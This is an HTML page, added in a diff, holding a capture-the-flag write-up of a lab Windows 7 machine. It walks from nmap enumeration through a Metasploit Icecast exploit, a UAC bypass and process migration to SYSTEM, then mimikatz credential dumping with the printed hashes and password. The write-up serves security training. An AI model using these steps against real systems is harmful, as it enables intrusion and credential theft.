@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Ice Enumeration nmap PORT STATE SERVICE REASON VERSION135/tcp open msrpc syn-ack Microsoft Windows RPC139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn445/tcp open microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)3389/tcp open ssl/ms-wbt-server? syn-ack| ssl-cert: Subject: commonName=Dark-PC| Issuer: commonName=Dark-PC| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha1WithRSAEncryption| Not valid before: 2021-11-09T01:04:38| Not valid after: 2022-05-11T01:04:38| MD5: c2cb 143b f9c6 ac54 b425 0a60 8906 c4dc| SHA-1: 5009 f1e1 6c50 e160 5b08 ec91 138f 3001 e1ab ebd4| -----BEGIN CERTIFICATE-----| MIIC0jCCAbqgAwIBAgIQWdotJunPLqZKUeGBMEa/cTANBgkqhkiG9w0BAQUFADAS| MRAwDgYDVQQDEwdEYXJrLVBDMB4XDTIxMTEwOTAxMDQzOFoXDTIyMDUxMTAxMDQz| OFowEjEQMA4GA1UEAxMHRGFyay1QQzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC| AQoCggEBAK3iiROzM2/JhP5ZlTbpLF4bDHwtqGtikJZQiYl9YlQyunXYd7g9wuyr| q40&#43;LqPhGhL/9AYoICA3bioFTMG&#43;qtwUFcxHD9iiQf/O6esz8oOeP1RJkD0CzD5u| kZtt6ZUzFDvYViMreE&#43;xjKl1R3NN4paZX8ItkjSPRuFMbWKEcmTK5ueAS0ydRl5k| Xt43&#43;NN/mxk7hkzif41nS/a6kdiSK2dAf/aeUUccbNMx9ln5neZvjX1aiUBZR9FG| x7KrnpwllTF33F7LLxbmuZAmQO30IletT2Y5cJ7up3Kikmb&#43;ZOpa&#43;ulhovayZI&#43;E| R&#43;jKTWn/eCrZ1ayuLaGjxDIag4LOp40CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYB| BQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQAGkB&#43;WbnS3JDae| w8aoKztZjvhN9vEvcqS/8ovSZfTiO9NvhoKs2cM2UqYoWfH/TU&#43;vrH3tuE524S3&#43;| gVwpTHKNzoo1N/WUC8TMsZvvYX2VoJdZTfMLSR7j0PLjAqD7RjQhWjFTPPYmy1hz| NaON&#43;TdKHxxyl79STd&#43;WV8V42OzKwPkk1seHzTwu4s42rOrpactHH/3QGSj0UD4J| yTZv79XFEOV9HYKkaBNvOMLgd1tJ8ajQQ8cwq5F1&#43;qpQ6iyozowb/uF/TX2YLE&#43;7| fXmhE1d51W8iByjscywdbzxWZEqb2SFCXVdNTRXWQkM3I5YxT3Eg9ti43c75iDaH| RvDzv&#43;fG|_-----END CERTIFICATE-----|_ssl-date: 2021-11-10T01:14:13&#43;00:00; &#43;2m30s from scanner time." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/ice/ice/" />
+
+
+    <title>
+        
+             :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="">
+<meta itemprop="description" content="Ice Enumeration nmap PORT STATE SERVICE REASON VERSION135/tcp open msrpc syn-ack Microsoft Windows RPC139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn445/tcp open microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)3389/tcp open ssl/ms-wbt-server? syn-ack| ssl-cert: Subject: commonName=Dark-PC| Issuer: commonName=Dark-PC| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha1WithRSAEncryption| Not valid before: 2021-11-09T01:04:38| Not valid after: 2022-05-11T01:04:38| MD5: c2cb 143b f9c6 ac54 b425 0a60 8906 c4dc| SHA-1: 5009 f1e1 6c50 e160 5b08 ec91 138f 3001 e1ab ebd4| -----BEGIN CERTIFICATE-----| MIIC0jCCAbqgAwIBAgIQWdotJunPLqZKUeGBMEa/cTANBgkqhkiG9w0BAQUFADAS| MRAwDgYDVQQDEwdEYXJrLVBDMB4XDTIxMTEwOTAxMDQzOFoXDTIyMDUxMTAxMDQz| OFowEjEQMA4GA1UEAxMHRGFyay1QQzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC| AQoCggEBAK3iiROzM2/JhP5ZlTbpLF4bDHwtqGtikJZQiYl9YlQyunXYd7g9wuyr| q40&#43;LqPhGhL/9AYoICA3bioFTMG&#43;qtwUFcxHD9iiQf/O6esz8oOeP1RJkD0CzD5u| kZtt6ZUzFDvYViMreE&#43;xjKl1R3NN4paZX8ItkjSPRuFMbWKEcmTK5ueAS0ydRl5k| Xt43&#43;NN/mxk7hkzif41nS/a6kdiSK2dAf/aeUUccbNMx9ln5neZvjX1aiUBZR9FG| x7KrnpwllTF33F7LLxbmuZAmQO30IletT2Y5cJ7up3Kikmb&#43;ZOpa&#43;ulhovayZI&#43;E| R&#43;jKTWn/eCrZ1ayuLaGjxDIag4LOp40CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYB| BQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQAGkB&#43;WbnS3JDae| w8aoKztZjvhN9vEvcqS/8ovSZfTiO9NvhoKs2cM2UqYoWfH/TU&#43;vrH3tuE524S3&#43;| gVwpTHKNzoo1N/WUC8TMsZvvYX2VoJdZTfMLSR7j0PLjAqD7RjQhWjFTPPYmy1hz| NaON&#43;TdKHxxyl79STd&#43;WV8V42OzKwPkk1seHzTwu4s42rOrpactHH/3QGSj0UD4J| yTZv79XFEOV9HYKkaBNvOMLgd1tJ8ajQQ8cwq5F1&#43;qpQ6iyozowb/uF/TX2YLE&#43;7| fXmhE1d51W8iByjscywdbzxWZEqb2SFCXVdNTRXWQkM3I5YxT3Eg9ti43c75iDaH| RvDzv&#43;fG|_-----END CERTIFICATE-----|_ssl-date: 2021-11-10T01:14:13&#43;00:00; &#43;2m30s from scanner time.">
+
+<meta itemprop="wordCount" content="921"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Ice Enumeration nmap PORT STATE SERVICE REASON VERSION135/tcp open msrpc syn-ack Microsoft Windows RPC139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn445/tcp open microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)3389/tcp open ssl/ms-wbt-server? syn-ack| ssl-cert: Subject: commonName=Dark-PC| Issuer: commonName=Dark-PC| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha1WithRSAEncryption| Not valid before: 2021-11-09T01:04:38| Not valid after: 2022-05-11T01:04:38| MD5: c2cb 143b f9c6 ac54 b425 0a60 8906 c4dc| SHA-1: 5009 f1e1 6c50 e160 5b08 ec91 138f 3001 e1ab ebd4| -----BEGIN CERTIFICATE-----| MIIC0jCCAbqgAwIBAgIQWdotJunPLqZKUeGBMEa/cTANBgkqhkiG9w0BAQUFADAS| MRAwDgYDVQQDEwdEYXJrLVBDMB4XDTIxMTEwOTAxMDQzOFoXDTIyMDUxMTAxMDQz| OFowEjEQMA4GA1UEAxMHRGFyay1QQzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC| AQoCggEBAK3iiROzM2/JhP5ZlTbpLF4bDHwtqGtikJZQiYl9YlQyunXYd7g9wuyr| q40&#43;LqPhGhL/9AYoICA3bioFTMG&#43;qtwUFcxHD9iiQf/O6esz8oOeP1RJkD0CzD5u| kZtt6ZUzFDvYViMreE&#43;xjKl1R3NN4paZX8ItkjSPRuFMbWKEcmTK5ueAS0ydRl5k| Xt43&#43;NN/mxk7hkzif41nS/a6kdiSK2dAf/aeUUccbNMx9ln5neZvjX1aiUBZR9FG| x7KrnpwllTF33F7LLxbmuZAmQO30IletT2Y5cJ7up3Kikmb&#43;ZOpa&#43;ulhovayZI&#43;E| R&#43;jKTWn/eCrZ1ayuLaGjxDIag4LOp40CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYB| BQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQAGkB&#43;WbnS3JDae| w8aoKztZjvhN9vEvcqS/8ovSZfTiO9NvhoKs2cM2UqYoWfH/TU&#43;vrH3tuE524S3&#43;| gVwpTHKNzoo1N/WUC8TMsZvvYX2VoJdZTfMLSR7j0PLjAqD7RjQhWjFTPPYmy1hz| NaON&#43;TdKHxxyl79STd&#43;WV8V42OzKwPkk1seHzTwu4s42rOrpactHH/3QGSj0UD4J| yTZv79XFEOV9HYKkaBNvOMLgd1tJ8ajQQ8cwq5F1&#43;qpQ6iyozowb/uF/TX2YLE&#43;7| fXmhE1d51W8iByjscywdbzxWZEqb2SFCXVdNTRXWQkM3I5YxT3Eg9ti43c75iDaH| RvDzv&#43;fG|_-----END CERTIFICATE-----|_ssl-date: 2021-11-10T01:14:13&#43;00:00; &#43;2m30s from scanner time."/>
+
+
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="Ice Enumeration nmap PORT STATE SERVICE REASON VERSION135/tcp open msrpc syn-ack Microsoft Windows RPC139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn445/tcp open microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)3389/tcp open ssl/ms-wbt-server? syn-ack| ssl-cert: Subject: commonName=Dark-PC| Issuer: commonName=Dark-PC| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha1WithRSAEncryption| Not valid before: 2021-11-09T01:04:38| Not valid after: 2022-05-11T01:04:38| MD5: c2cb 143b f9c6 ac54 b425 0a60 8906 c4dc| SHA-1: 5009 f1e1 6c50 e160 5b08 ec91 138f 3001 e1ab ebd4| -----BEGIN CERTIFICATE-----| MIIC0jCCAbqgAwIBAgIQWdotJunPLqZKUeGBMEa/cTANBgkqhkiG9w0BAQUFADAS| MRAwDgYDVQQDEwdEYXJrLVBDMB4XDTIxMTEwOTAxMDQzOFoXDTIyMDUxMTAxMDQz| OFowEjEQMA4GA1UEAxMHRGFyay1QQzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC| AQoCggEBAK3iiROzM2/JhP5ZlTbpLF4bDHwtqGtikJZQiYl9YlQyunXYd7g9wuyr| q40&#43;LqPhGhL/9AYoICA3bioFTMG&#43;qtwUFcxHD9iiQf/O6esz8oOeP1RJkD0CzD5u| kZtt6ZUzFDvYViMreE&#43;xjKl1R3NN4paZX8ItkjSPRuFMbWKEcmTK5ueAS0ydRl5k| Xt43&#43;NN/mxk7hkzif41nS/a6kdiSK2dAf/aeUUccbNMx9ln5neZvjX1aiUBZR9FG| x7KrnpwllTF33F7LLxbmuZAmQO30IletT2Y5cJ7up3Kikmb&#43;ZOpa&#43;ulhovayZI&#43;E| R&#43;jKTWn/eCrZ1ayuLaGjxDIag4LOp40CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYB| BQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQAGkB&#43;WbnS3JDae| w8aoKztZjvhN9vEvcqS/8ovSZfTiO9NvhoKs2cM2UqYoWfH/TU&#43;vrH3tuE524S3&#43;| gVwpTHKNzoo1N/WUC8TMsZvvYX2VoJdZTfMLSR7j0PLjAqD7RjQhWjFTPPYmy1hz| NaON&#43;TdKHxxyl79STd&#43;WV8V42OzKwPkk1seHzTwu4s42rOrpactHH/3QGSj0UD4J| yTZv79XFEOV9HYKkaBNvOMLgd1tJ8ajQQ8cwq5F1&#43;qpQ6iyozowb/uF/TX2YLE&#43;7| fXmhE1d51W8iByjscywdbzxWZEqb2SFCXVdNTRXWQkM3I5YxT3Eg9ti43c75iDaH| RvDzv&#43;fG|_-----END CERTIFICATE-----|_ssl-date: 2021-11-10T01:14:13&#43;00:00; &#43;2m30s from scanner time." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/ice/ice/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+
+<meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/ice/ice/"></a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="ice">Ice</h1>
+<!-- raw HTML omitted -->
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>PORT      STATE SERVICE            REASON  VERSION
+135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server? syn-ack
+| ssl-cert: Subject: commonName=Dark-PC
+| Issuer: commonName=Dark-PC
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2021-11-09T01:04:38
+| Not valid after:  2022-05-11T01:04:38
+| MD5:   c2cb 143b f9c6 ac54 b425 0a60 8906 c4dc
+| SHA-1: 5009 f1e1 6c50 e160 5b08 ec91 138f 3001 e1ab ebd4
+| -----BEGIN CERTIFICATE-----
+| MIIC0jCCAbqgAwIBAgIQWdotJunPLqZKUeGBMEa/cTANBgkqhkiG9w0BAQUFADAS
+| MRAwDgYDVQQDEwdEYXJrLVBDMB4XDTIxMTEwOTAxMDQzOFoXDTIyMDUxMTAxMDQz
+| OFowEjEQMA4GA1UEAxMHRGFyay1QQzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
+| AQoCggEBAK3iiROzM2/JhP5ZlTbpLF4bDHwtqGtikJZQiYl9YlQyunXYd7g9wuyr
+| q40+LqPhGhL/9AYoICA3bioFTMG+qtwUFcxHD9iiQf/O6esz8oOeP1RJkD0CzD5u
+| kZtt6ZUzFDvYViMreE+xjKl1R3NN4paZX8ItkjSPRuFMbWKEcmTK5ueAS0ydRl5k
+| Xt43+NN/mxk7hkzif41nS/a6kdiSK2dAf/aeUUccbNMx9ln5neZvjX1aiUBZR9FG
+| x7KrnpwllTF33F7LLxbmuZAmQO30IletT2Y5cJ7up3Kikmb+ZOpa+ulhovayZI+E
+| R+jKTWn/eCrZ1ayuLaGjxDIag4LOp40CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYB
+| BQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQAGkB+WbnS3JDae
+| w8aoKztZjvhN9vEvcqS/8ovSZfTiO9NvhoKs2cM2UqYoWfH/TU+vrH3tuE524S3+
+| gVwpTHKNzoo1N/WUC8TMsZvvYX2VoJdZTfMLSR7j0PLjAqD7RjQhWjFTPPYmy1hz
+| NaON+TdKHxxyl79STd+WV8V42OzKwPkk1seHzTwu4s42rOrpactHH/3QGSj0UD4J
+| yTZv79XFEOV9HYKkaBNvOMLgd1tJ8ajQQ8cwq5F1+qpQ6iyozowb/uF/TX2YLE+7
+| fXmhE1d51W8iByjscywdbzxWZEqb2SFCXVdNTRXWQkM3I5YxT3Eg9ti43c75iDaH
+| RvDzv+fG
+|_-----END CERTIFICATE-----
+|_ssl-date: 2021-11-10T01:14:13+00:00; +2m30s from scanner time.
+5357/tcp  open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+8000/tcp  open  http               syn-ack Icecast streaming media server
+| http-methods:
+|_  Supported Methods: GET
+|_http-title: Site doesn&#39;t have a title (text/html).
+49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49159/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
+Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| p2p-conficker:
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 26444/tcp): CLEAN (Couldn&#39;t connect)
+|   Check 2 (port 14833/tcp): CLEAN (Couldn&#39;t connect)
+|   Check 3 (port 36762/udp): CLEAN (Timeout)
+|   Check 4 (port 17683/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| nbstat: NetBIOS name: DARK-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:01:ea:57:15:c7 (unknown)
+| Names:
+|   DARK-PC&lt;00&gt;          Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   DARK-PC&lt;20&gt;          Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+| Statistics:
+|   02 01 ea 57 15 c7 00 00 00 00 00 00 00 00 00 00 00
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| smb2-security-mode:
+|   2.1:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-11-10T01:14:00
+|_  start_date: 2021-11-10T01:04:22
+| smb-os-discovery:
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Dark-PC
+|   NetBIOS computer name: DARK-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-11-09T19:14:00-06:00
+|_clock-skew: mean: 1h32m29s, deviation: 3h00m00s, median: 2m29s
+</code></pre><p>windows machines are less frequent thus my favorites</p>
+<p>Icecast running on port 8000</p>
+<p>The room is called ice don&rsquo;t even look further</p>
+<p>we use metasploit <code>exploit(windows/http/icecast_header)</code></p>
+<pre tabindex="0"><code>meterpreter &gt; getuid
+Server username: Dark-PC\Dark
+meterpreter &gt; sysinfo
+Computer : DARK-PC
+OS : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture : x64
+System Language : en_US
+Domain : WORKGROUP
+Logged On Users : 2
+Meterpreter : x86/windows
+</code></pre><p>That was quick access</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>run <code>post/multi/recon/local_exploit_suggester</code></p>
+<p>I had issues here&hellip;the module was suggesting a wrong exploit</p>
+<blockquote>
+<p>While this doesn&rsquo;t work the best on x64 machines</p>
+</blockquote>
+<p>the room even foretold it</p>
+<pre tabindex="0"><code>meterpreter &gt; run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.166.226 - Collecting local exploits for x86/windows...
+[*] 10.10.166.226 - 4 exploit checks are being tried...
+[+] 10.10.166.226 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+</code></pre><p>only 4 checks are being tried</p>
+<p>The right expploit to use is</p>
+<p><code>exploit(windows/local/bypassuac_eventvwr)</code></p>
+<pre tabindex="0"><code>meterpreter &gt; getprivs
+
+# Enabled Process Privileges
+
+## Name
+
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+</code></pre><p>SeTakeOwnershipPrivilege is what allows us to get files</p>
+<p>we migrate to spoolsv.exe (best service for privesc)</p>
+<pre tabindex="0"><code>meterpreter &gt; migrate 1260
+[*] Migrating from 1848 to 1260...
+[*] Migration completed successfully.
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre><p>Ah good ol&rsquo; mimikatz</p>
+<pre tabindex="0"><code>meterpreter &gt; load kiwi
+Loading extension kiwi...
+.#####. mimikatz 2.2.0 20191125 (x64/windows)
+.## ^ ##. &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+
+## / \ ## /\*\*\* Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+
+## \ / ## &gt; http://blog.gentilkiwi.com/mimikatz
+
+&#39;## v ##&#39; Vincent LE TOUX ( vincent.letoux@gmail.com )
+&#39;#####&#39; &gt; http://pingcastle.com / http://mysmartlogon.com \*\*\*/
+
+Success.
+</code></pre><p>Now those are mimikatz (kiwi) commands</p>
+<pre tabindex="0"><code>meterpreter &gt; help
+
+# Kiwi Commands
+
+Command Description
+
+---
+
+creds_all Retrieve all credentials (parsed)
+creds_kerberos Retrieve Kerberos creds (parsed)
+creds_livessp Retrieve Live SSP creds
+creds_msv Retrieve LM/NTLM creds (parsed)
+creds_ssp Retrieve SSP creds
+creds_tspkg Retrieve TsPkg creds (parsed)
+creds_wdigest Retrieve WDigest creds (parsed)
+dcsync Retrieve user account information via DCSync (unparsed)
+dcsync_ntlm Retrieve user account NTLM hash, SID and RID via DCSync
+golden_ticket_create Create a golden kerberos ticket
+kerberos_ticket_list List all kerberos tickets (unparsed)
+kerberos_ticket_purge Purge any in-use kerberos tickets
+kerberos_ticket_use Use a kerberos ticket
+kiwi_cmd Execute an arbitary mimikatz command (unparsed)
+lsa_dump_sam Dump LSA SAM (unparsed)
+lsa_dump_secrets Dump LSA secrets (unparsed)
+password_change Change the password/hash of a user
+wifi_list List wifi profiles/creds for the current user
+wifi_list_shared List shared wifi profiles/creds (requires SYSTEM)
+
+# msv credentials
+
+Username Domain LM NTLM SHA1
+
+---
+
+Dark Dark-PC e52cac67419a9a22ecb08369099ed302 7c4fe5eada682714a036e39378362bab 0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb
+
+# wdigest credentials
+
+Username Domain Password
+
+---
+
+(null) (null) (null)
+DARK-PC$ WORKGROUP (null)
+Dark Dark-PC Password01!
+
+# tspkg credentials
+
+Username Domain Password
+
+---
+
+Dark Dark-PC Password01!
+
+# kerberos credentials
+
+Username Domain Password
+
+---
+
+(null) (null) (null)
+Dark Dark-PC Password01!
+dark-pc$ WORKGROUP (null)
+</code></pre><p>Now we can RDP to the machine with the workstation creds:</p>
+<p><code>Dark : Password01!</code></p>
+<p>we have a new machine in our collection</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+
+
+
+    </body>
+</html>
